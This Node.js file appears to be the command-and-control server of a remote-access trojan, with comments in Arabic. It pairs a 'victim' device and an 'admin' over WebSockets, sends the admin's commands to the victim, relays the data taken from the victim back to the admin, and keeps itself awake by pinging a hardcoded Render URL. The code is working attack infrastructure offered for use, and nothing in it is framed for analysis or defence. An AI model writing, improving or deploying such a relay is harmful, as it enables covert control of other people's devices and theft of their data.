const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 8080;

const server = http.createServer((req, res) => {
    fs.readFile(path.join(__dirname, 'dashboard.html'), (err, data) => {
        if (err) {
            res.writeHead(500);
            return res.end('Error loading dashboard.html');
        }
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(data);
    });
});

// إعداد السيرفر ليعمل مع WebSockets بشكل صحيح
const wss = new WebSocket.Server({ server });
let victim = null, admin = null;

wss.on('connection', (ws, req) => {
    // طباعة عنوان المتصل للتأكد من وصول الطلب
    console.log("🔗 New connection attempt...");

    ws.on('message', (message) => {
        try {
            const msg = JSON.parse(message);
            
            if (msg.type === 'login') { 
                victim = ws; 
                console.log("🟢 Victim Connected: " + (msg.model || "Unknown"));
                if (admin) admin.send(JSON.stringify(msg));
            }
            
            if (msg.type === 'login_admin') { 
                admin = ws; 
                console.log("👤 Admin Logged In");
                if (victim) victim.send(JSON.stringify({type: 'login', model: 'Connected'}));
            }
            
            if (msg.type === 'command' && victim) {
                victim.send(JSON.stringify(msg));
            }
            
            if (msg.type === 'data' && admin) {
                admin.send(JSON.stringify(msg));
            }

            if (msg.type === 'ping') {
                ws.send(JSON.stringify({type: 'pong'}));
            }
            
        } catch (e) {
            console.error("Error parsing JSON:", e);
        }
    });

    ws.on('close', () => { 
        if (ws === victim) { victim = null; console.log("🔴 Victim Disconnected"); }
        if (ws === admin) { admin = null; console.log("👤 Admin Logged Out"); }
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
});

// الحفاظ على استيقاظ السيرفر
const axios = require('axios');
// تأكد من وضع رابطك الصحيح هنا بدلاً من localhost إذا لم يتعرف عليه رندر تلقائياً
const APP_URL = "https://hamza-link777.onrender.com"; 

setInterval(() => {
    axios.get(APP_URL).catch(() => {});
}, 600000); 
